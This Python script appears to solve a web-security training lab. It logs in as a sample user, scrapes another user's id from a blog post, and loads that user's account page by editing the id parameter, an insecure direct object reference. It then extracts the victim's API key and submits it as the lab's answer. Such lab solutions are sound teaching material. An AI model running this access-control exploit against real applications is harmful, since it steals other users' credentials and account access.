import requests, re
from bs4 import BeautifulSoup

s = requests.Session()

site = 'ac9b1fe01e4bf47cc00a1c1000430015.web-security-academy.net'

login_url = f'https://{site}/login'

login_data = {
    'username' : 'wiener',
    'password' : 'peter'
}

resp = s.post(login_url, data=login_data)

resp = s.get(f'https://{site}/post?postId=9')
soup = BeautifulSoup(resp.text,'html.parser')
carlos_userid = soup.find('a',text='carlos')['href'].split('=')[1]
print(carlos_userid)

resp = s.get(f'https://{site}/my-account?id={carlos_userid}')
soup = BeautifulSoup(resp.text,'html.parser')
div_text = soup.find('div', text=re.compile('API')).text
api_key = div_text.split(' ')[4]

url = f'https://{site}/submitSolution'
resp = s.post(url,data={'answer':api_key})

